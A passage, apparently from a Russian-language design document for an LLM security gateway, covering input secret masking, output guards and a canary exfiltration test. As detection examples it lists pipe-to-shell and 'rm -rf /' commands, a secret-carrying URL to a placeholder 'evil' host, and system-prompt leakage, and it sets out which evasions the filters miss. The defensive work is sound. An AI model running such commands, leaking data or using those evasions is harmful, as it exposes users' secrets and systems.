| 10 | OpenAI/DeepSeek key | `sk-abcDEF…` | ✅ поймали (`openai_key`) |

Маскирование: `sk-proj-abc123… → [REDACTED_API_KEY]` (остальной текст цел);
email/карта/телефон → `[REDACTED_EMAIL]` / `[REDACTED_CARD]` / `[REDACTED_PHONE]`.

Политика: `block` (в LLM ничего не уходит, возвращаем warning) и `mask`
(в LLM уходит замаскированный текст, ответ отдаётся) — оба режима покрыты тестами.

## Output guard

| Класс | Пример | Вердикт |
|---|---|---|
| Сгенерированный ключ в ответе | `…используй sk-abcDEF…` | redact (`[REDACTED_API_KEY]`) |
| Секрет в URL (в т.ч. base64) | `http://evil/x?d=SBLAB{…}` | redact (ссылка вырезана) |
| Утечка system prompt | ответ цитирует инструкции | block |
| Опасная команда | `curl … | sh`, `rm -rf /` | block |

## Сценарий «gateway перед lab»

Бэкенд (agent-lab) отдаёт канарейку `SBLAB{egress-…}` в адресе ссылки → output
guard с `knownSecrets` вырезает её, помечает `secret_exfil_url`, запись попадает
в `interceptions`. Доказывает связку «gateway → lab» без прогона живой модели.

## Пример лога перехвата (маскированный, из локального смоука)

```json
{
  "createdAt": "…", "ip": "127.0.0.1",
  "userPreview": "мой ключ [REDACTED_API_KEY] и карта [REDACTED_CARD]",
  "inputFindings": [
    { "type": "api_key", "kind": "aws_access_key", "encoding": "plain" },
    { "type": "credit_card", "kind": "credit_card", "encoding": "plain" }
  ],
  "inputAction": "block", "blocked": true,
  "outputVerdict": "pass", "totalTokens": 0, "costUsd": 0
}
```

Сырое значение секрета в БД не попадает никогда — ни при block, ни при mask
(в аудите только маскированный превью + тип/подтип/кодировка находки).

## Что НЕ ловим (осознанные границы)

- **Голый длинный ряд цифр как телефон/карта.** Требуем `+`/разделитель для
  телефона и валидный Luhn для карты — иначе ложные срабатывания на id/счётчиках.
  Плата: телефон без разделителей (`79001234567`) и «карта» с битым Luhn проходят.
- **Склейка секрета только через конкатенацию строковых литералов** (`"a" + "b"`).
  Разрыв через переменные (`a = "sk-"; b = a + "proj"`) или переносы строк не
  восстанавливаем — это уже поток данных, а не текст промпта.
- **Base64 только для правдоподобных блобов** (≥16 симв., печатаемая расшифровка).
  Секрет в двойном base64 или в exotic-кодировке (base32, gzip) не декодируем.
- **Output guard от утечки system prompt** — по дословному совпадению окна ≥40
  символов. Пересказ инструкций своими словами не ловится (это уже семантика).
- **Cost** считает по фиксированному тарифу за 1M токенов; cache-hit цены DeepSeek
  и скидки не моделируются.
